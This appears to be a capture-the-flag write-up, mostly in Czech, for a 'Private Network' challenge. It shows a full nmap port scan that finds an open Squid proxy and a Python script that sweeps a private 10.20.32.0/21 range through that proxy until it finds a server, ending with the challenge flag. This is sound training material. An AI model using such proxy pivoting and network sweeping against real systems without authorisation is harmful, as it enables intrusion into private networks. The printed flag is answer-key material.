# Private Network

## Zadání

```
Hi Expert,

the archaeologists have found some network scheme (we suppose that mentioning the ancient cave painting was just a joke) and they think that there exists some very important web server in network 10.20.32.0/21. The same scheme indicates that IP address 78.128.216.8 should be used to get access to private network. Get the data from above mentioned web server.

Good Luck!

Hint: Check the services on given server 78.128.216.8.
```

## Řešení

* `nmap -p 1-65535 -v 78.128.216.8`

```
Discovered open port 3128/tcp on 78.128.216.8
Completed Connect Scan at 17:07, 5.59s elapsed (65535 total ports)
Nmap scan report for 78.128.216.8
Host is up (0.0098s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE
517/tcp  filtered talk
518/tcp  filtered ntalk
2376/tcp filtered docker
3128/tcp open     squid-http
```

* Na serveru tedy běží proxy server Squid a naším úkolem bude ho využít pro přístup do sítě `10.20.32.0/21`
* `10.20.32.0/21` odpovídá rozsahu adres `10.20.32.1` až `10.20.39.254` (http://jodies.de/ipcalc?host=10.20.32.0&mask1=21)

## Program pro výpis vlajky

[solve.py](solve.py)
```python
import requests, sys

proxy = {'http': 'http://78.128.216.8:3128' }

for i in range(32, 40):
    for j in range(1, 255):
        addr = 'http://10.20.%i.%i' % (i, j)
        print(addr)
        r = requests.get(addr, proxies=proxy)
        if 'FLAG' in r.text or 'ERR_ACCESS_DENIED' not in r.text:
            print(r.text)
            sys.exit(0)
```

## Výstup
```
http://10.20.32.1
...
http://10.20.35.11
<html>
	<h2> It took a long time, flag is FLAG{XG5T-WLWl-HqjH-2E7V}</h2>
</html>
```